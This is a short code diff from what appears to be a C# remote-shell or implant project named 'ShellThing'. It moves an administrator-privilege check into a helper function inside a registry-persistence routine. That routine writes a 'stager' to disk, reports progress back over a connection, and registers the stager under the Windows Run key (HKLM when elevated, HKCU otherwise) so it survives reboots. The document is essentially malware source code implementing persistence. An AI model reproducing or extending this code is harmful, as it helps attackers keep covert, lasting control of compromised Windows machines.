@@ -44,23 +44,12 @@ namespace ShellThing
         private void RegistryPersistence()
         {
             // TODO: Accept user input for registry value and file names with option for default random name generation
-            bool isAdmin = false;
-            WindowsIdentity currentUserIdentity = WindowsIdentity.GetCurrent();
-            if (currentUserIdentity == null)
-            {
-                throw new NullReferenceException("RegistryPersistence: Unable to get current user identity\n");
-            }
-
-            WindowsPrincipal principal = new WindowsPrincipal(currentUserIdentity);
-            // This will resolve false if the user is a local administrator but not elevated (UAC)
-            isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);
-
             connection.SendData("[*] Writing stager to file...\n");
             string fileName = WriteStagerToFile();
 
             string key;
 
-            if (isAdmin)
+            if (CheckAdminPrivileges())
             {
                 key = @"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run";
             }
@@ -104,6 +93,22 @@ namespace ShellThing
             
 
             return filePath;
+        }
+
+        public static bool CheckAdminPrivileges()
+        {
+            bool isAdmin = false;
+            WindowsIdentity currentUserIdentity = WindowsIdentity.GetCurrent();
+            if (currentUserIdentity == null)
+            {
+                throw new NullReferenceException("RegistryPersistence: Unable to get current user identity\n");
+            }
+
+            WindowsPrincipal principal = new WindowsPrincipal(currentUserIdentity);
+            // This will resolve false if the user is a local administrator but not elevated (UAC)
+            isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);
+
+            return isAdmin;
         }
     }
 }
